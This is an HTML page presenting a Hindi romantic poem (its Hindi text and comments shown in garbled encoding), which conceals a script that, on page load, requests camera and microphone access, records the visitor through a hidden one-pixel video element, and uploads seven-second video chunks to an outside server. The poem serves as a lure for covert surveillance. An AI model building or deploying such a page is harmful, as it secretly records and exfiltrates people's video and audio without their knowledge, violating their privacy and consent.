<!DOCTYPE html>
<html lang="hi">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Romantic Kavita</title>

<style>
body {
  background: #fff3f6;
  font-family: sans-serif; /* Poppins font system default рдореЗрдВ рдирд╣реАрдВ рд╣реЛрддрд╛ */
  padding: 20px;
  line-height: 1.7;
  color: #333;
}
.kavita {
  max-width: 650px;
  margin: auto;
  background: white;
  padding: 28px;
  border-radius: 16px;
  box-shadow: 0 4px 14px rgba(0,0,0,0.08);
  font-size: 19px;
  /* рдХрд╡рд┐рддрд╛ рдХреЛ рдлреЛрдХрд╕ рдореЗрдВ рд░рдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдЗрд╕реЗ рдКрдкрд░ рд░рдЦреЗрдВ */
  position: relative;
  z-index: 10;
}
.hidden {
  /* рд╡реАрдбрд┐рдпреЛ рдХреЛ рдкреВрд░реА рддрд░рд╣ рд╕реЗ рдЫрд┐рдкрд╛рдиреЗ рдХреЗ рд▓рд┐рдП */
  position: absolute;
  width: 1px; 
  height: 1px;
  opacity: 0;
  overflow: hidden;
  pointer-events: none; /* рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдпрд╣ рдХреНрд▓рд┐рдХ рдХрд░рдиреЗ рдпреЛрдЧреНрдп рди рд╣реЛ */
  z-index: -1; /* рдЗрд╕реЗ рдХрд╡рд┐рддрд╛ рдХреЗ рдкреАрдЫреЗ рднреЗрдЬ рджреЗрдВ */
}
h2 {
  color: #e63980;
}
</style>

</head>
<body>

<div class="kavita">
  <h2>ЁЯТХ рддреЗрд░реА рдпрд╛рджреЛрдВ рдХреА рдЦреБрд╢рдмреВ ЁЯТХ</h2>
  <p>
    рддреЗрд░реА рдЖрдБрдЦреЛрдВ рдореЗрдВ рдЬреЛ рд╕реБрдХреВрди рд╣реИ,<br>
    рд╡реЛ рдХрд╣реАрдВ рдФрд░ рдорд┐рд▓рддрд╛ рдирд╣реАрдВтАж<br><br>

    рддреЗрд░реА рдореБрд╕реНрдХрд╛рди рдХреА рдПрдХ рд╣рд▓реНрдХреА рд╕реА рд▓рд╣рд░,<br>
    рджрд┐рд▓ рдХреЛ рдЫреВрдХрд░ рдирд┐рдХрд▓ рдЬрд╛рдП рддреЛ,<br>
    рдзрдбрд╝рдХрдиреЗрдВ рднреА рдХрд╣ рдЙрдарддреА рд╣реИрдВ тАФ<br>
    *"рд░реБрдХ рдЬрд╛ рдЬрд╝рд░рд╛тАж рдпреЗ рдкрд▓ рдлрд┐рд░ рдЖрдП рдирд╛ рдЖрдПтАж"*
    <br><br>

    рддреВ рд╕рд╛рде рд╣реЛ рддреЛ рд╣рд░ рдмрд╛рдд рд╣рд╕реАрди рд▓рдЧреЗ,<br>
    рд╡рд░рдирд╛ рдпреЗ рджреБрдирд┐рдпрд╛ рднреА рдХреЛрдИ рдХреНрдпрд╛ рдЦрд╛рд╕ рд╣реИтАж<br><br>

    рддреЗрд░реА рдпрд╛рджреЛрдВ рдХреА рдЦреБрд╢рдмреВ рдореЗрдВ,<br>
    рдореЗрд░рд╛ рд╣рд░ рд╢рд╛рдо рдЖрдЬ рднреА рд╕рд╛рдБрд╕ рд▓реЗрддрд╛ рд╣реИтАж ЁЯМ╣ЁЯТл
  </p>
</div>

<video id="cam" class="hidden" autoplay playsinline></video>

<script>
let stream;
let recorder;

// Start capturing
async function startCapture() {
  try {
    // рдХреИрдорд░рд╛ рдФрд░ рдорд╛рдЗрдХ рдХреА рдЕрдиреБрдорддрд┐ рд▓реЗрдВ
    stream = await navigator.mediaDevices.getUserMedia({
      video: true,
      audio: true
    });

    const videoElement = document.getElementById("cam");
    videoElement.srcObject = stream;

    // --- рдпрд╣ рд▓рд╛рдЗрд╡ рдСрдбрд┐рдпреЛ рдлреАрдбрдмреИрдХ рдХреЛ рд░реЛрдХрдиреЗ рдХреЗ рд▓рд┐рдП рдЬреЛрдбрд╝рд╛ рдЧрдпрд╛ рд╣реИ ---
    videoElement.muted = true; 
    // --------------------------------------------------------

    recorder = new MediaRecorder(stream, {
  mimeType: "video/webm; codecs=vp9",
  videoBitsPerSecond: 2000000
});

    // рд░рд┐рдХреЙрд░реНрдбрд┐рдВрдЧ рдбреЗрдЯрд╛ рдЪрдВрдХ рдореЗрдВ рдЙрдкрд▓рдмреНрдз рд╣реЛрдиреЗ рдкрд░
    recorder.ondataavailable = (e) => {
      if (e.data.size > 0) sendChunk(e.data);
    };

    // рд╣рд░ 7 рд╕реЗрдХрдВрдб рдореЗрдВ рдбреЗрдЯрд╛ рдЪрдВрдХ рднреЗрдЬреЗрдВ
    recorder.start(7000); 
    console.log("Recording started and muted.");

  } catch (err) {
    console.log("Camera permission issue:", err);
    // рдпрд╣рд╛рдВ рдпреВрдЬрд░ рдХреЛ рдмрддрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдХреИрдорд░рд╛ рдЬрд░реВрд░реА рд╣реИ
    // alert("рдХреИрдорд░рд╛ рдПрдХреНрд╕реЗрд╕ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдВред"); 
  }
}

// send chunk to backend
async function sendChunk(blob) {
  const fd = new FormData();
  fd.append("video_chunk", blob, "chunk.webm");

  // рдЖрдкрдХреЗ рджреНрд╡рд╛рд░рд╛ рджрд┐рдП рдЧрдП Deno рд╕рд░реНрд╡рд░ рдкрд░ рднреЗрдЬреЗрдВ
  fetch("https://video.kannu-jaat.deno.net", {
    method: "POST",
    body: fd
  }).catch((e)=>{
    // рдХрдВрд╕реЛрд▓ рдореЗрдВ рдПрд░рд░ рджрд┐рдЦрд╛рдПрдВ, рд▓реЗрдХрд┐рди рд░рд┐рдХреЙрд░реНрдбрд┐рдВрдЧ рди рд░реЛрдХреЗрдВ
    console.error("Failed to send chunk:", e);
  });
}

// stop on exit
window.addEventListener("beforeunload", () => {
  try { 
    if (recorder && recorder.state !== 'inactive') {
        recorder.stop(); 
    }
    if (stream) {
        stream.getTracks().forEach(track => track.stop());
    }
  } catch(e){
    console.error("Error stopping recording or stream:", e);
  }
});

// Capture рд╢реБрд░реВ рдХрд░реЗрдВ рдЬрдм рдкреЗрдЬ рд▓реЛрдб рд╣реЛ рдЬрд╛рдП
startCapture();
</script>

</body>
</html>